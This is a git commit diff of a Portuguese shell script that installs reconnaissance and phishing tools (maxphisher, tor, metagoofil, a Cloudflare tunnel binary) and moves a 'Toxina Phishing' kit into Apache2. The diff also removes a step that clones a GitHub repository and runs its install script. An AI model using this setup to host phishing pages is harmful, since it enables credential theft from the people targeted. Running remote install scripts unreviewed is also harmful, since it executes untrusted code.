d2a656064e7d32b58b0767cdfb3585d19f16b4aa
Cesar Augusto B <114227831+cesarbtakeda@users.noreply.github.com>
2025-02-23 00:00:43 -0300

    Update requeriments.sh

--- requeriments.sh
+++ requeriments.sh
@@ -5,7 +5,7 @@ c="clear"
 i="sudo apt-get install -y"
 p="sudo pip3 install"
 b="--break-system-package"
-px="pipx install xyz"
+
 
 echo "[**Atualizando arquivos...**]"
 sudo apt-get update -y && sudo apt-get full-upgrade -y
@@ -46,8 +46,7 @@ $i apache2
 $i tor
 $i apktool
 $i metagoofil
-$i make
-$c
+
 
 # Instalando Cloudflare
 echo "[**Baixando CloudFlare**]"
@@ -56,10 +55,6 @@ chmod +x cloudflare
 sudo mv cloudflare /usr/local/bin/
 echo "[**CloudFlare baixado!!**]"
 
-# Instalando uro
-echo "[**Fazendo o download do uro.**]"
-$p uro $b
-echo "[**Download do uro finalizado!**]"
 
 # Instalando ferramentas de Phishing
 echo "[**Fazendo download de ferramentas de Phishing**]"
@@ -67,26 +62,8 @@ $p maxphisher $b
 $p colorama $b
 $p sockets $b
 $p requests $b
-$p katana $b
-$p waybackurls $b
-$p hakrawler $b
-$px
 $c
 
-# Clonando repositório NucleiFuzzer e executando instalação
-if [ ! -d "NucleiFuzzer" ]; then
-  echo "[**Clonando NucleiFuzzer**]"
-  sudo git clone https://github.com/0xKayala/NucleiFuzzer.git
-  cd NucleiFuzzer || exit
-  sudo chmod +x install.sh && ./install.sh
-  cd ..
-else
-  echo "[**Repositório NucleiFuzzer já clonado e pronto para funcionar!**]"
-fi
-$c
-
-echo "[**Dependências baixadas com sucesso**]"
-$c
 
 # Movendo Toxina Phishing para o Apache2
 echo "[**Movendo o Toxina Ph1shing para o Apache2**]"
